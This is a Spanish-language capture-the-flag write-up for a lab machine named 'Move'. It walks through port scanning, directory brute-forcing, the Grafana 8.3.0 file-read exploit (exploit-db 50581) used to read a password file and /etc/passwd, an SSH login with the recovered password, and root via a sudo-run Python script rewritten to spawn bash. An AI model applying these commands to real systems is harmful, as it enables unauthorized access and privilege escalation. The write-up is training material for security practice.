Maquina: Move

Autor: El Pinguino de Mario

Dificultad: Facil

![Screenshot 2024-11-14 182124](https://github.com/user-attachments/assets/ba30a676-672a-4ec8-ae50-10572cfde490)

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

ping 172.17.0.2 -c 1

![Screenshot 2024-11-14 190703](https://github.com/user-attachments/assets/48c308b4-634e-480b-821c-37775f04516c)

despues scaneamos con nmap un escaneo de puertos y servicios detallado

nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts

![Screenshot 2024-11-14 190720](https://github.com/user-attachments/assets/101b95b4-4844-4090-af75-8897c2d26206)

el puerto 22 perteneciente al servicio SSH y el puerto 80 perteneciente al servicio HTTP y el puerto 3000 están abiertos

volvemos a scanear con nmap para obtener más información sobre ese puerto específicamente.

sudo nmap -sCV -p22,80,3000 -v 172.17.0.2

![Screenshot 2024-11-14 191016](https://github.com/user-attachments/assets/77d20fe7-c9e9-4d4c-ac0a-4b2cac0da068)

El puerto 80 y el 3000 podemos encontrar servicios web y en el 3000 nos aparece una redirección a un panel de Login. 

![Screenshot 2024-11-14 190907](https://github.com/user-attachments/assets/41bc539a-7660-4a74-8f6e-dd065c47ea83)

![Screenshot 2024-11-14 190926](https://github.com/user-attachments/assets/748e135b-d660-4227-b5de-428e9d08ea61)

buscamos directorios con la herramienta Gobuster

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml,js -u http://172.17.0.2

Encontramos un archivo /maintenance.html

![Screenshot 2024-11-14 191143](https://github.com/user-attachments/assets/09a819e7-87c8-44be-8b41-5ae2d56d8800)

Hemos encontrado un encabezado en HTML que revela la ruta de un archivo potencialmente interesante, aunque actualmente no tenemos acceso al sistema para explorarlo más a fondo. Guardaremos esta información para usarla mas adelante.

![Screenshot 2024-11-14 191159](https://github.com/user-attachments/assets/10d83fa9-a34d-4e73-afba-37d17c50e6d8)

enumeramos del puerto 3000

Hemos encontrado un panel de inicio de sesión de Grafana. Lo más notable es que en la parte inferior del panel se muestra la versión específica del servicio.

la versión específica de Grafana que encontramos es vulnerable a un exploit que permite la lectura de archivos en el sistema.

searchsploit grafana 8.3.0

![Screenshot 2024-11-14 191242](https://github.com/user-attachments/assets/d4b790fc-6118-4965-bc28-14b1b3ee31a7)

copiamos el exploit que encontramos en exploit.db

![Screenshot 2024-11-14 191336](https://github.com/user-attachments/assets/7dcdfa16-0e40-4607-b981-81b801cad2ed)

creamos 50581.py y pegamos el exploit

![Screenshot 2024-11-14 191439](https://github.com/user-attachments/assets/a983c99e-f7a0-4555-a9b2-2bb34b86d0e2)

python3 50581.py -H http://172.17.0.2:3000

leemos el archivo /tmp/pass.txt

encontramos una contraseña

![Screenshot 2024-11-14 191701](https://github.com/user-attachments/assets/0cb57d2e-5103-4e38-9982-4d56b5e8a707)

leemos el archivo /etc/passwd

encontramos un usuario

![Screenshot 2024-11-14 192218](https://github.com/user-attachments/assets/8552b79a-e8a3-49f0-ad37-9eb409e2282a)

Vamos a conectarnos vía SSH con el usuario y contraseña

ssh freddy@172.17.0.2

t9sH76gpQ82UFeZ3GXZS

![Screenshot 2024-11-14 192556](https://github.com/user-attachments/assets/9e5d3fae-2379-4379-9412-518102d1970a)

Si hacemos un sudo -l nos aparece lo siguiente

Como podemos ejecutar el script mantienance.py como root lo que podemos hacer es modificar el script y hacer que al ejecutar spawnee una bash como root de la siguiente forma

![Screenshot 2024-11-14 192610](https://github.com/user-attachments/assets/ff893f94-03e5-43fb-94b0-22b2c0e3473c)

vamos hasta el directorio /opt 

nano maintenance.py

![Screenshot 2024-11-14 193917](https://github.com/user-attachments/assets/f96161b4-1e1c-4b27-9831-bd7dc9a9ce49)

import os
os.system("/usr/bin/python3 -c 'import os; os.system(\"/bin/bash\")'")

![Screenshot 2024-11-14 194637](https://github.com/user-attachments/assets/c16f1978-226b-4e0b-adf5-6a822f0e54a1)

ejecutamos el archivo

sudo /usr/bin/python3 /opt/maintenance.py

whoami

![Screenshot 2024-11-14 194612](https://github.com/user-attachments/assets/fd4aee46-158b-4fbc-bdfb-bf61bd814563)
